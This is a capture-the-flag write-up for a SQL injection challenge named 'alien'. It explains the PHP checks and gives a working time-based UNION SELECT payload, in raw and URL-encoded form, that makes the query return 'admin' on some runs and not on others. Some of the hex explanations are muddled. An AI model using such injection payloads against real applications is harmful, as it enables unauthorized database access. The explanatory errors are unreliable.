---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 32
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/d4c56057-01fa-4f0c-8360-441f987427c3)

We are provided with the SQL queries:

```sql
SELECT id FROM prob_alien WHERE no={$_GET[no]}
```

```sql
SELECT id FROM prob_alien WHERE no='{$_GET[no]}'
```

In order to solve this challenge, we have to pass the following checks:

```php
$r = mysqli_fetch_array(mysqli_query($db,$query));
if($r['id'] !== "admin") exit("sandbox1");
$r = mysqli_fetch_array(mysqli_query($db,$query));
if($r['id'] === "admin") exit("sandbox2");
$r = mysqli_fetch_array(mysqli_query($db,$query2));
if($r['id'] === "admin") exit("sandbox");
$r = mysqli_fetch_array(mysqli_query($db,$query2));   if($r['id'] === "admin") solve("alien");
```

- The first query checks if the fetched `id` is not `"admin"`. If true, it exits.
- The second query checks if the fetched `id` is `"admin"`. If true, it exits.
- The third query checks if the fetched `id` is `"admin"`. If true, it exits.
- The fourth query checks if the fetched `id` is `"admin"`. If true, it calls a function `solve("alien")`.

In order to solve this challenge, we need to create a self-modifying query.


## Self-modifying query

```sql
1 UNION SELECT concat(lower(hex(10+(!sleep(1)&&now()%2=1))),0x646d696e)%23' UNION SELECT concat(lower(hex(9+(!sleep(1)&&now()%2=1))), 0x646d696e)%23
```

- **`(!sleep(1) && now() % 2 == 1)`**:
	- `!sleep(1)` effectively becomes `False` or `0` since after 1 second, the `sleep` function returns. Otherwise it is `True` or `1`.
	- `now() % 2 == 1` checks if the current time in seconds is an odd number.
	- Combine these using the `&&` (logical AND), which evaluates to `False` or `0` if `!sleep(1)` is `0`. Otherwise it results in `True` or `1`.
- **`hex(10+(!sleep(1)&&now()%2=1))`**:
	- If result of `sleep` is `1`, `hex(10+1)` results in `b`.
	- If result of `sleep` is `0`, `hex(10+0)` results in `a`.
- **`lower(hex(10+(!sleep(1)&&now()%2=1)))`**:
	- Converts the entire string to lowercase.
- **`concat(lower(hex(10+(!sleep(1)&&now()%2=1))),0x646d696e)`**
	- Concatenates the string to `dmin`.
	- If result of `sleep` is `1`, `concat(0x11,0x646d696e)` results in `bdmin`.
	- If result of `sleep` is `0`, `concat(0x10,0x646d696e)` results in `admin`.

&nbsp;

If we provide the following URI parameter:

```
?no=1%20UNION%20SELECT%20concat(lower(hex(10%2b(!sleep(1)%26%26now()%2=1))),%200x646d696e)%23%27%20UNION%20SELECT%20concat(lower(hex(9%2b(!sleep(1)%26%26now()%2=1))),%200x646d696e)%23%20
```

The resultant first query becomes:

```sql
SELECT id FROM prob_alien WHERE no=1 UNION SELECT concat(lower(hex(10+(!sleep(1)&&now()%2=1))),0x646d696e)#' UNION SELECT concat(lower(hex(9+(!sleep(1)&&now()%2=1))), 0x646d696e)%23
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/ae221b2c-088e-40c2-9bf4-72d563eb8e9c)
